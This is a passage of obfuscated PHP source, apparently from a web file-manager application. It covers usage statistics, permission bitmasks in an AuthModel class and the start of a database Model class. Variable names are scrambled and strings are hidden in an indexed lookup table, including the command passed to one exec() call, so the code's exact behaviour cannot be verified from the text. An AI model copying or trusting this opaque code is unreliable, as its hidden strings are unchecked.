$ŸÚäë‹Ü[$ş¯ãÏ[1799]] = $ŸÚäë‹Ü[$ş¯ãÏ[769]]; } foreach ($Ç·£‰ğ[$š©È©­] as $—ìÇ¶· => $ş­ öÚ) { $¡¦®öĞî = array($ş¯ãÏ[224] => $ŸÚäë‹Ü[$ş¯ãÏ[224]], $ş¯ãÏ[1576] => $ş­ öÚ); $¡¦®öĞî[$½Ä‚ä¾[$š©È©­]] = isset($ŸÚäë‹Ü[$—ìÇ¶·]) ? $ŸÚäë‹Ü[$—ìÇ¶·] : 0; $¨Ï‘ß£[] = $¡¦®öĞî; } } return $¨Ï‘ß£; } public function validDate($ØÂÎ¦Úğ, $«ê¥¹‹Ğ) { $ı±Ø‰º =& $_SERVER[Ã¶¡¶„æ]; $£ıå‰ = date($ı±Ø‰º[1802], strtotime($ı±Ø‰º[1803])); $œ–Š•ÍÇ = array($£ıå‰); switch ($ØÂÎ¦Úğ) { case $ı±Ø‰º[1656]: $«‹Û¨Ğ‘ = mktime(0, 0, 0, date($ı±Ø‰º[1819]), date($ı±Ø‰º[1398]) - date($ı±Ø‰º[1461]) + 7 - 7, date($ı±Ø‰º[1820])); $¤ñÔñµŠ = 0; do { $ĞÄ²°¹Ç = date($ı±Ø‰º[1802], $«‹Û¨Ğ‘ - 3600 * 24 * 7 * $¤ñÔñµŠ); $œ–Š•ÍÇ[] = $ĞÄ²°¹Ç; $¤ñÔñµŠ++; } while ($«ê¥¹‹Ğ < $ĞÄ²°¹Ç); break; case $ı±Ø‰º[1654]: $¤ñÔñµŠ = 1; do { $ŸäôËÜ— = date($ı±Ø‰º[1821], strtotime("\x2d\40{$¤ñÔñµŠ}\x20\x6d\157\156\164\x68\x73")); $œ–Š•ÍÇ[] = $ŸäôËÜ—; $¤ñÔñµŠ++; } while ($«ê¥¹‹Ğ < $ŸäôËÜ—); break; case $ı±Ø‰º[1822]: $‰÷å˜´Ø = (int) date($ı±Ø‰º[1820], strtotime($«ê¥¹‹Ğ)); $ÄŠÚ¹†Ñ = (int) date($ı±Ø‰º[1820]); if ($‰÷å˜´Ø >= $ÄŠÚ¹†Ñ) { break; } for ($‰÷å˜´Ø; $‰÷å˜´Ø < $ÄŠÚ¹†Ñ; $‰÷å˜´Ø++) { $œ–Š•ÍÇ[] = $‰÷å˜´Ø . $ı±Ø‰º[1823]; } break; default: break; } if ($«ê¥¹‹Ğ > end($œ–Š•ÍÇ)) { array_pop($œ–Š•ÍÇ); } sort($œ–Š•ÍÇ); return $œ–Š•ÍÇ; } public function listTable($›ÖÌº´) { $“ àÎé = ucfirst($›ÖÌº´); return Model($“ àÎé)->listData(); } public function option($ÑËŠùÏ) { $ëõëÙ‚ = $_SERVER[Ã¶¡¶„æ][1824] . ucfirst($ÑËŠùÏ); return $this->{$ëõëÙ‚}(); } private function optionUser() { $¤İ¡ ™‰ =& $_SERVER[Ã¶¡¶„æ]; $ôÛöÔ¥ß = Model($¤İ¡ ™‰[535])->count($¤İ¡ ™‰[1676]); $‘…¶¡³ = Model($¤İ¡ ™‰[535])->where($¤İ¡ ™‰[1825])->count($¤İ¡ ™‰[1676]); $á›Úáã = intval($GLOBALS[$¤İ¡ ™‰[6]][$¤İ¡ ™‰[349]][$¤İ¡ ™‰[1631]]) / 3600; $‰ÏïĞ = strtotime("\55{$á›Úáã}\40\150\x6f\165\x72\x73"); $ï‚¦Á = strtotime(date($¤İ¡ ™‰[1806])); if ($‰ÏïĞ < $ï‚¦Á) { $‰ÏïĞ = $ï‚¦Á; } $´€Õäğí = array($¤İ¡ ™‰[1826] => array($¤İ¡ ™‰[1028], $‰ÏïĞ)); $÷‘ÕòÚ = (int) Model($¤İ¡ ™‰[535])->where($´€Õäğí)->count($¤İ¡ ™‰[1676]); if (!$÷‘ÕòÚ) { $÷‘ÕòÚ = 1; } $´€Õäğí = array($¤İ¡ ™‰[1826] => array($¤İ¡ ™‰[1028], $ï‚¦Á)); $‰¦±•½ = Model($¤İ¡ ™‰[535])->where($´€Õäğí)->count($¤İ¡ ™‰[1676]); return array($¤İ¡ ™‰[765] => (int) $ôÛöÔ¥ß, $¤İ¡ ™‰[1827] => (int) ($ôÛöÔ¥ß - $‘…¶¡³), $¤İ¡ ™‰[1828] => (int) $‘…¶¡³, $¤İ¡ ™‰[1829] => (int) $‰¦±•½, $¤İ¡ ™‰[1830] => $÷‘ÕòÚ); } private function optionFile() { $áÉĞ³ =& $_SERVER[Ã¶¡¶„æ]; $ëù‘ø¥ = $this->sourceSize(); $¢±²˜Êô = $ëù‘ø¥[$áÉĞ³[76]]; $Åş‰ìÌ² = $ëù‘ø¥[$áÉĞ³[1799]]; $³†§öœ = Model($áÉĞ³[831])->where(array($áÉĞ³[410] => 0))->count($áÉĞ³[402]); $„Å†Á³œ = array($áÉĞ³[410] => 0, $áÉĞ³[200] => array($áÉĞ³[1028], strtotime(date($áÉĞ³[1806])))); $í²ÑÉìù = Model($áÉĞ³[831])->where($„Å†Á³œ)->sum($áÉĞ³[76]); $‚ó€ö¹ = Model($áÉĞ³[831])->where($„Å†Á³œ)->count($áÉĞ³[402]); return array($áÉĞ³[769] => $¢±²˜Êô, $áÉĞ³[1799] => $Åş‰ìÌ², $áÉĞ³[1831] => $¢±²˜Êô - $Åş‰ìÌ², $áÉĞ³[1832] => (int) $í²ÑÉìù, $áÉĞ³[771] => (int) $³†§öœ, $áÉĞ³[1833] => (int) $‚ó€ö¹); } private function optionAccess() { $ˆ†°‰è‡ =& $_SERVER[Ã¶¡¶„æ]; return array($ˆ†°‰è‡[765] => $this->typeLogCnt(), $ˆ†°‰è‡[107] => $this->typeLogCnt($ˆ†°‰è‡[107]), $ˆ†°‰è‡[452] => $this->typeLogCnt($ˆ†°‰è‡[452]), $ˆ†°‰è‡[1834] => $this->typeLogCnt($ˆ†°‰è‡[1834]), $ˆ†°‰è‡[1835] => $this->typeLogCnt($ˆ†°‰è‡[1835]), $ˆ†°‰è‡[600] => $this->typeLogCnt($ˆ†°‰è‡[12], $ˆ†°‰è‡[1810])); } private function typeLogCnt($Ø Ãô¿Œ = '', $÷ˆÊÀÁ = "\x69\x64") { $Ä¥µ©«Å =& $_SERVER[Ã¶¡¶„æ]; $É˜‚Üç´ = array($Ä¥µ©«Å[107] => array($Ä¥µ©«Å[1836], $Ä¥µ©«Å[1837]), $Ä¥µ©«Å[452] => array($Ä¥µ©«Å[1838], $Ä¥µ©«Å[1839]), $Ä¥µ©«Å[1834] => array($Ä¥µ©«Å[1840], $Ä¥µ©«Å[1841], $Ä¥µ©«Å[1842]), $Ä¥µ©«Å[1835] => array($Ä¥µ©«Å[1843], $Ä¥µ©«Å[1844]), $Ä¥µ©«Å[1845] => array($Ä¥µ©«Å[1846], $Ä¥µ©«Å[1847], $Ä¥µ©«Å[1848])); $Üúìş¥‹ = strtotime(date($Ä¥µ©«Å[1806])); $ù¿£ø•ö = array($Ä¥µ©«Å[200] => array($Ä¥µ©«Å[1028], $Üúìş¥‹)); if ($Ø Ãô¿Œ) { $ù¿£ø•ö[$Ä¥µ©«Å[33]] = array($Ä¥µ©«Å[7], $É˜‚Üç´[$Ø Ãô¿Œ]); } $†Êœ÷¦ß = Model($Ä¥µ©«Å[1809])->where($ù¿£ø•ö)->count($÷ˆÊÀÁ); return (int) $†Êœ÷¦ß; } private function optionServer() { $Ü¾Ä«‹— =& $_SERVER[Ã¶¡¶„æ]; $ÓŸîÅù = $this->diskDriver(); $ó§Æ¡—× = KodIO::defaultDriver(); $¿«ôœíÊ = array($Ü¾Ä«‹—[823] => $ó§Æ¡—×[$Ü¾Ä«‹—[399]]); $ÆæÒšüŸ = Model($Ü¾Ä«‹—[471])->where($¿«ôœíÊ)->sum($Ü¾Ä«‹—[76]); $¹Ü¦ÛÎ = explode($Ü¾Ä«‹—[53], $_SERVER[$Ü¾Ä«‹—[143]]); $“Ë¯­È = $¹Ü¦ÛÎ[0]; $ÁÄş¸›× = $GLOBALS[$Ü¾Ä«‹—[6]][$Ü¾Ä«‹—[21]]; $ÕÑğì­ˆ = $ÁÄş¸›×[$Ü¾Ä«‹—[990]]; if ($ÕÑğì­ˆ == $Ü¾Ä«‹—[978]) { $ÖãÒü³ë = explode($Ü¾Ä«‹—[1294], $ÁÄş¸›×[$Ü¾Ä«‹—[989]]); $ÕÑğì­ˆ = $ÖãÒü³ë[0]; } if ($ÕÑğì­ˆ == $Ü¾Ä«‹—[926] || $ÕÑğì­ˆ == $Ü¾Ä«‹—[810]) { $âóçÕ±• = Model()->db()->query($Ü¾Ä«‹—[1849]); $şÍ×ú¢î = $âóçÕ±•[0] && isset($âóçÕ±•[0][$Ü¾Ä«‹—[1575]]) ? $âóçÕ±•[0][$Ü¾Ä«‹—[1575]] : 0; $ÕÑğì­ˆ = $Ü¾Ä«‹—[1850] . ($şÍ×ú¢î ? $Ü¾Ä«‹—[8] . $şÍ×ú¢î : $Ü¾Ä«‹—[12]); } $ÏİÅÍÔ³ = $GLOBALS[$Ü¾Ä«‹—[6]][$Ü¾Ä«‹—[349]][$Ü¾Ä«‹—[833]]; return array($Ü¾Ä«‹—[1851] => $ÓŸîÅù ? $ÓŸîÅù[$Ü¾Ä«‹—[1852]] : 0, $Ü¾Ä«‹—[1853] => $ÓŸîÅù ? $ÓŸîÅù[$Ü¾Ä«‹—[1854]] : 0, $Ü¾Ä«‹—[1855] => (int) $ó§Æ¡—×[$Ü¾Ä«‹—[1852]] * 1024 * 1024 * 1024, $Ü¾Ä«‹—[1856] => (int) $ÆæÒšüŸ, $Ü¾Ä«‹—[1857] => ucfirst($“Ë¯­È), $Ü¾Ä«‹—[1858] => $Ü¾Ä«‹—[1859] . PHP_VERSION, $Ü¾Ä«‹—[1860] => phpBuild64() ? 64 : 32, $Ü¾Ä«‹—[764] => str_replace($Ü¾Ä«‹—[1144], $Ü¾Ä«‹—[1006], $ÕÑğì­ˆ), $Ü¾Ä«‹—[349] => ucfirst($ÏİÅÍÔ³), $Ü¾Ä«‹—[32] => $_SERVER[$Ü¾Ä«‹—[1861]]); } private function diskDriver() { $Æöºî²â =& $_SERVER[Ã¶¡¶„æ]; $Î‚ÂÓ…Õ = $Æöºî²â[8]; $»Ö¶Ş­˜ = $GLOBALS[$Æöºî²â[6]][$Æöºî²â[1311]] == $Æöºî²â[1312]; if ($»Ö¶Ş­˜) { $Î‚ÂÓ…Õ = $Æöºî²â[1862]; if (function_exists($Æöºî²â[1863])) { exec($Æöºî²â[1864], $·ë¡»); $Î‚ÂÓ…Õ = $·ë¡»[1] . $Æöºî²â[8]; } } if (!file_exists($Î‚ÂÓ…Õ)) { return; } $ƒÅó°­‹ = @disk_total_space($Î‚ÂÓ…Õ); $‰µ¿˜øú = $ƒÅó°­‹ - @disk_free_space($Î‚ÂÓ…Õ); return array($Æöºî²â[1852] => $ƒÅó°­‹, $Æöºî²â[1854] => $‰µ¿˜øú); } public function fileChart($»Öı½‹¤) { $½İ•Ø‰ =& $_SERVER[Ã¶¡¶„æ]; if (isset($»Öı½‹¤[$½İ•Ø‰[1676]])) { return Model($½İ•Ø‰[831])->userFileTypeProfile($»Öı½‹¤[$½İ•Ø‰[1676]]); } if (isset($»Öı½‹¤[$½İ•Ø‰[1865]])) { return Model($½İ•Ø‰[831])->groupFileTypeProfile($»Öı½‹¤[$½İ•Ø‰[1865]]); } $®Æ—Ø = $this->sourceSize(); $õÕÒ©Ø = array($½İ•Ø‰[432] => 0, $½İ•Ø‰[411] => 1); $¦²ğşœ = Model($½İ•Ø‰[831])->where($õÕÒ©Ø)->sum($½İ•Ø‰[76]); $õÕÒ©Ø[$½İ•Ø‰[411]] = 2; $¦±Î’Ã = Model($½İ•Ø‰[831])->where($õÕÒ©Ø)->sum($½İ•Ø‰[76]); return array($½İ•Ø‰[769] => $®Æ—Ø[$½İ•Ø‰[76]], $½İ•Ø‰[1799] => $®Æ—Ø[$½İ•Ø‰[1799]], $½İ•Ø‰[1800] => (int) $¦²ğşœ, $½İ•Ø‰[1801] => (int) $¦±Î’Ã); } private function sourceSize() { $„µºŞğ =& $_SERVER[Ã¶¡¶„æ]; $©ğ´œ = Model($„µºŞğ[831])->where(array($„µºŞğ[410] => 0))->sum($„µºŞğ[76]); $ÎØáœŞ« = Model($„µºŞğ[471])->sum($„µºŞğ[76]); if ($ÎØáœŞ« > $©ğ´œ) { $ÎØáœŞ« = $©ğ´œ; } return array($„µºŞğ[76] => (int) $©ğ´œ, $„µºŞğ[1799] => (int) $ÎØáœŞ«); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¦Î”¬¸‹ =& $_SERVER[Ã¶¡¶„æ]; $ı²øíĞÎ = array(array($¦Î”¬¸‹[420] => LNG($¦Î”¬¸‹[1866]), $¦Î”¬¸‹[1867] => $¦Î”¬¸‹[1868], $¦Î”¬¸‹[1869] => 1, $¦Î”¬¸‹[1870] => 1, $¦Î”¬¸‹[1871] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¦Î”¬¸‹[420] => LNG($¦Î”¬¸‹[1872]), $¦Î”¬¸‹[1867] => $¦Î”¬¸‹[1873], $¦Î”¬¸‹[1869] => 2, $¦Î”¬¸‹[1870] => 1, $¦Î”¬¸‹[1871] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¦Î”¬¸‹[420] => LNG($¦Î”¬¸‹[1874]), $¦Î”¬¸‹[1867] => $¦Î”¬¸‹[1875], $¦Î”¬¸‹[1869] => 3, $¦Î”¬¸‹[1870] => 1, $¦Î”¬¸‹[1871] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¦Î”¬¸‹[420] => LNG($¦Î”¬¸‹[1876]), $¦Î”¬¸‹[1867] => $¦Î”¬¸‹[1877], $¦Î”¬¸‹[1869] => 4, $¦Î”¬¸‹[1870] => 1, $¦Î”¬¸‹[1871] => self::AUTH_SHOW | self::AUTH_VIEW), array($¦Î”¬¸‹[420] => LNG($¦Î”¬¸‹[1878]), $¦Î”¬¸‹[1867] => $¦Î”¬¸‹[1879], $¦Î”¬¸‹[1869] => 5, $¦Î”¬¸‹[1870] => 1, $¦Î”¬¸‹[1871] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¦Î”¬¸‹[420] => LNG($¦Î”¬¸‹[1880]), $¦Î”¬¸‹[1867] => $¦Î”¬¸‹[1881], $¦Î”¬¸‹[1869] => 6, $¦Î”¬¸‹[1870] => 1, $¦Î”¬¸‹[1871] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¦Î”¬¸‹[420] => LNG($¦Î”¬¸‹[1882]), $¦Î”¬¸‹[1867] => $¦Î”¬¸‹[1883], $¦Î”¬¸‹[1869] => 7, $¦Î”¬¸‹[1870] => 1, $¦Î”¬¸‹[1871] => 0)); return $ı²øíĞÎ; } public static function authCheck($ Ïï’, $Œ“î¢Ä) { $Ï­ğòïÈ =& $_SERVER[Ã¶¡¶„æ]; $ Ïï’ = intval($ Ïï’); if ($GLOBALS[$Ï­ğòïÈ[503]] && $GLOBALS[$Ï­ğòïÈ[6]][$Ï­ğòïÈ[1884]]) { return !0; } if ($ Ïï’ <= 0) { return !1; } if (($ Ïï’ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ Ïï’ & $Œ“î¢Ä); } public static function authCheckShow($É¼©Ë´) { return self::authCheck($É¼©Ë´, self::AUTH_SHOW); } public static function authCheckView($á¡µŒ£˜) { return self::authCheck($á¡µŒ£˜, self::AUTH_VIEW); } public static function authCheckDownload($§Á½°°¿) { return self::authCheck($§Á½°°¿, self::AUTH_DOWNLOAD); } public static function authCheckUpload($³–ÀÉ) { return self::authCheck($³–ÀÉ, self::AUTH_UPLOAD); } public static function authCheckEdit($Ùñâ·Ôä) { return self::authCheck($Ùñâ·Ôä, self::AUTH_EDIT); } public static function authCheckRemove($ã„­‘ë­) { return self::authCheck($ã„­‘ë­, self::AUTH_REMOVE); } public static function authCheckShare($¸é…¦ŒË) { return self::authCheck($¸é…¦ŒË, self::AUTH_SHARE); } public static function authCheckComment($¹¼‘¿¬) { return self::authCheck($¹¼‘¿¬, self::AUTH_COMMENT); } public static function authCheckEvent($¶¼ÄûÅÀ) { return self::authCheck($¶¼ÄûÅÀ, self::AUTH_EVENT); } public static function authCheckRoot($„Òæ‡¾‚) { return self::authCheck($„Òæ‡¾‚, self::AUTH_ROOT); } public static function authCheckAction($ÙÕ£Œ¾, $›Ìµ³¢À) { $ãŠ™©ìä =& $_SERVER[Ã¶¡¶„æ]; $ùÈ™Æ•€ = array($ãŠ™©ìä[1885] => self::AUTH_VIEW, $ãŠ™©ìä[1209] => self::AUTH_DOWNLOAD, $ãŠ™©ìä[107] => self::AUTH_UPLOAD, $ãŠ™©ìä[1835] => self::AUTH_EDIT, $ãŠ™©ìä[1834] => self::AUTH_REMOVE, $ãŠ™©ìä[1845] => self::AUTH_SHARE, $ãŠ™©ìä[354] => self::AUTH_COMMENT, $ãŠ™©ìä[1664] => self::AUTH_EVENT, $ãŠ™©ìä[1886] => self::AUTH_ROOT); if (!isset($ùÈ™Æ•€[$›Ìµ³¢À])) { return; } $³ıÃÜ÷í = $ùÈ™Æ•€[$›Ìµ³¢À]; $ÙÕ£Œ¾ = intval($ÙÕ£Œ¾); if ($ÙÕ£Œ¾ <= 0) { return !1; } if (($ÙÕ£Œ¾ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÙÕ£Œ¾ & $³ıÃÜ÷í); } public static function authDisable($©œĞ¥ı£, $í€÷†êı) { if (intval($©œĞ¥ı£) <= 0) { return 0; } return intval($©œĞ¥ı£) & ~$í€÷†êı; } public $optionType = "\x53\x79\x73\x74\x65\x6d\56\x73\157\x75\162\143\145\101\x75\x74\150\114\x69\x73\164"; public $field = array("\156\141\155\145", "\141\x75\164\x68", "\x6c\141\142\x65\x6c", "\x64\151\163\x70\x6c\x61\x79", "\163\x79\163\164\x65\x6d", "\x73\x6f\162\164"); public function initData() { $¥µìˆ±¥ = $this->authDefault(); foreach ($¥µìˆ±¥ as $š«¯šŒ) { $this->add($š«¯šŒ); } } public function findAuth($š¶ş—Æ×, $õØğ¶Õã) { $¦˜çóÆ€ =& $_SERVER[Ã¶¡¶„æ]; $œœÚöØ” = parent::listData(); foreach ($œœÚöØ” as $Ò×ÎóÚ) { $›…ÓÙğì = intval($Ò×ÎóÚ[$¦˜çóÆ€[413]]); if ($›…ÓÙğì <= 0 || $Ò×ÎóÚ[$¦˜çóÆ€[1887]] == 0) { continue; } if (($›…ÓÙğì & $š¶ş—Æ×) != $š¶ş—Æ×) { continue; } if (($›…ÓÙğì & $õØğ¶Õã) != 0) { continue; } return $Ò×ÎóÚ[$¦˜çóÆ€[399]]; } return !1; } public function findAuthReadOnly() { $€£À“Î÷ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $åŠ÷º¸Ò = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($€£À“Î÷, $åŠ÷º¸Ò); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ÖÉ¡á³ =& $_SERVER[Ã¶¡¶„æ]; $´ãÈ¤ì· = parent::listData(); $ÕÁ”²íî = !1; foreach ($´ãÈ¤ì· as $ÍÕŞ¶æ¢) { if ($ÍÕŞ¶æ¢[$ÖÉ¡á³[413]] <= 0 || $ÍÕŞ¶æ¢[$ÖÉ¡á³[1887]] == $ÖÉ¡á³[197]) { continue; } if (!$ÕÁ”²íî) { $ÕÁ”²íî = $ÍÕŞ¶æ¢; continue; } if ($ÕÁ”²íî[$ÖÉ¡á³[413]] > $ÍÕŞ¶æ¢[$ÖÉ¡á³[413]]) { $ÕÁ”²íî = $ÍÕŞ¶æ¢; } } return $ÕÁ”²íî ? $ÕÁ”²íî[$ÖÉ¡á³[399]] : $ÖÉ¡á³[12]; } public function listData($ìîºÍå = false, $†ò­Şî• = "\x73\157\x72\164", $š¥í£”› = false) { return parent::listData($ìîºÍå, $†ò­Şî•, $š¥í£”›); } public function update($ç¯Ì¢ô, $‹é¿ë´ù) { $‡ö´¿ =& $_SERVER[Ã¶¡¶„æ]; $ğ£¢å§Ì = parent::listData($ç¯Ì¢ô); $¥·”¿Æ  = $this->findByName($‹é¿ë´ù[$‡ö´¿[32]]); if (!$ğ£¢å§Ì || $¥·”¿Æ  && $¥·”¿Æ [$‡ö´¿[399]] != $ğ£¢å§Ì[$‡ö´¿[399]]) { return !1; } $this->filterAuth($‹é¿ë´ù[$‡ö´¿[413]]); return parent::update($ç¯Ì¢ô, $‹é¿ë´ù); } public function remove($«¦˜) { $Ú¼×œ«¹ = parent::listData($«¦˜); if (!$Ú¼×œ«¹ || $Ú¼×œ«¹[$_SERVER[Ã¶¡¶„æ][1299]]) { return !1; } return parent::remove($«¦˜); } public function add($†—¤ì×‚ = array()) { $çËóÌ’Ş =& $_SERVER[Ã¶¡¶„æ]; if ($this->findByName($†—¤ì×‚[$çËóÌ’Ş[32]])) { return !1; } $Ê¡¯®Ìú = array($çËóÌ’Ş[32] => $çËóÌ’Ş[12], $çËóÌ’Ş[413] => 1, $çËóÌ’Ş[1888] => $çËóÌ’Ş[1875], $çËóÌ’Ş[1887] => 1, $çËóÌ’Ş[1299] => 0, $çËóÌ’Ş[1889] => 0); $†—¤ì×‚ = array_merge($Ê¡¯®Ìú, $†—¤ì×‚); $†—¤ì×‚[$çËóÌ’Ş[1889]] = $this->getSort(); $this->filterAuth($†—¤ì×‚[$çËóÌ’Ş[413]]); return parent::insert($†—¤ì×‚); } private function getSort() { $Ÿ´ƒ¦¼À =& $_SERVER[Ã¶¡¶„æ]; $éé„éó = parent::listData(); $Œ×Ü´‘Œ = array_to_keyvalue($éé„éó, $Ÿ´ƒ¦¼À[12], $Ÿ´ƒ¦¼À[1889]); return empty($Œ×Ü´‘Œ) ? 0 : max($Œ×Ü´‘Œ) + 1; } private function filterAuth(&$È°“˜¬­) { if (!$È°“˜¬­) { return; } $®şıØ¸¬ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ÖÇ•¶ú = array(); foreach ($®şıØ¸¬ as $ƒÃ‰Ùú›) { if ($È°“˜¬­ & $ƒÃ‰Ùú›) { $ÖÇ•¶ú[] = $ƒÃ‰Ùú›; } } if (in_array(self::AUTH_ROOT, $ÖÇ•¶ú)) { $È°“˜¬­ = array_sum($®şıØ¸¬); return; } $Ôªª’šı = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ÖÇ•¶ú as $ƒÃ‰Ùú›) { if (isset($Ôªª’šı[$ƒÃ‰Ùú›])) { $ÖÇ•¶ú = array_merge($ÖÇ•¶ú, $Ôªª’šı[$ƒÃ‰Ùú›]); } } $ÖÇ•¶ú[] = self::AUTH_SHOW; $È°“˜¬­ = array_sum(array_unique($ÖÇ•¶ú)); } public function sort($’Ô–È«Í, $³ôİè«£) { return parent::update($’Ô–È«Í, $³ôİè«£); } } goto a±‘À¾Ì¸»; Cæ¥ö­Üæ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\154\x65", "\157\x72\x64\145\162", "\141\154\x69\141\x73", "\x68\141\166\151\x6e\x67", "\147\x72\157\165\160", "\154\157\x63\x6b", "\144\x69\x73\x74\x69\156\x63\164", "\x61\x75\164\x6f", "\x66\x69\154\164\145\x72", "\166\x61\x6c\x69\x64\141\x74\x65", "\162\145\163\165\x6c\x74", "\142\x69\156\x64", "\164\157\x6b\145\156"); public function __construct($ÂîÎ·ş³ = '', $ïÍ¥Ãçå = '', $È²³ôá = '') { $ñŠÇü =& $_SERVER[Ã¶¡¶„æ]; $this->_initialize(); if (!empty($ÂîÎ·ş³)) { if (strpos($ÂîÎ·ş³, $ñŠÇü[10])) { list($this->dbName, $this->name) = explode($ñŠÇü[10], $ÂîÎ·ş³); } else { $this->name = $ÂîÎ·ş³; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ïÍ¥Ãçå)) { $this->tablePrefix = $ñŠÇü[12]; } elseif ($ñŠÇü[12] != $ïÍ¥Ãçå) { $this->tablePrefix = $ïÍ¥Ãçå; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ñŠÇü[244]); } $this->db(0, empty($this->connection) ? $È²³ôá : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ÚŠ‰ğ›Ë =& $_SERVER[Ã¶¡¶„æ]; if (empty($this->fields)) { if (think_config($ÚŠ‰ğ›Ë[245])) { $û¼¹Á¼œ = $this->dbName ? $this->dbName : think_config($ÚŠ‰ğ›Ë[246]); $¹åÕ¿»ğ = think_var_cache($ÚŠ‰ğ›Ë[247] . strtolower(get_path_this($û¼¹Á¼œ) . $ÚŠ‰ğ›Ë[10] . $this->name)); if ($¹åÕ¿»ğ) { $‚óÉ·…ã = think_config($ÚŠ‰ğ›Ë[248]); if (empty($‚óÉ·…ã) || $¹åÕ¿»ğ[$ÚŠ‰ğ›Ë[249]] == $‚óÉ·…ã) { $this->fields = $¹åÕ¿»ğ; return; } } } $this->flush(); } } public function flush() { $ë”å¦Öú =& $_SERVER[Ã¶¡¶„æ]; $this->db->setModel($this->name); $ÙûÅÌÄ‹ = $this->db->getFields($this->getTableName()); if (!$ÙûÅÌÄ‹) { return !1; } $this->fields = array_keys($ÙûÅÌÄ‹); $this->fields[$ë”å¦Öú[250]] = !1; foreach ($ÙûÅÌÄ‹ as $ÖşÁ™è· => $ñ²»”—) { $Ê˜‹Ì—€[$ÖşÁ™è·] = $ñ²»”—[$ë”å¦Öú[33]]; if ($ñ²»”—[$ë”å¦Öú[39]]) { $this->fields[$ë”å¦Öú[251]] = $ÖşÁ™è·; if ($ñ²»”—[$ë”å¦Öú[42]]) { $this->fields[$ë”å¦Öú[250]] = !0; } } } $this->fields[$ë”å¦Öú[252]] = $Ê˜‹Ì—€; if (think_config($ë”å¦Öú[248])) { $this->fields[$ë”å¦Öú[249]] = think_config($ë”å¦Öú[248]); } if (think_config($ë”å¦Öú[245])) { $ú•Ü•í = $this->dbName ? $this->dbName : think_config($ë”å¦Öú[246]); think_var_cache($ë”å¦Öú[247] . strtolower(get_path_this($ú•Ü•í) . $ë”å¦Öú[10] . $this->name), $this->fields); } } public function switchModel($é›¶Ãıƒ, $Ş‰ó…¿ü = array()) { $…Á®ô¢Œ =& $_SERVER[Ã¶¡¶„æ]; $şû­·Ú¹ = ucwords(strtolower($é›¶Ãıƒ)) . $…Á®ô¢Œ[253]; if (!class_exists($şû­·Ú¹)) { think_exception($şû­·Ú¹ . think_lang($…Á®ô¢Œ[254])); } $this->_extModel = new $şû­·Ú¹($this->name); if (!empty($Ş‰ó…¿ü)) { foreach ($Ş‰ó…¿ü as $È¦äØîÔ) { $this->_extModel->setProperty($È¦äØîÔ, $this->{$È¦äØîÔ}); } } return $this->_extModel; } public function __set($ò¶Øô±, $×±óàå) { $this->data[$ò¶Øô±] = $×±óàå; } public function __get($Ü½³ ÓÏ) { return isset($this->data[$Ü½³ ÓÏ]) ? $this->data[$Ü½³ ÓÏ] : null; } public function __isset($æù öÌË) { return isset($this->data[$æù öÌË]); } public function __unset($Â«è‰Ê¯) { unset($this->data[$Â«è‰Ê¯]); } public function __call($Øšş‡±, $ñÂó˜¸ò) { $ù·ñõ‰¼ =& $_SERVER[Ã¶¡¶„æ]; if (in_array(strtolower($Øšş‡±), $this->methods, !0)) { $this->options[strtolower($Øšş‡±)] = $ñÂó˜¸ò[0]; return $this; } elseif (in_array(strtolower($Øšş‡±), array($ù·ñõ‰¼[255], $ù·ñõ‰¼[256], $ù·ñõ‰¼[257], $ù·ñõ‰¼[258], $ù·ñõ‰¼[259]), !0)) { $ì·Ø–Û¹ = isset($ñÂó˜¸ò[0]) ? 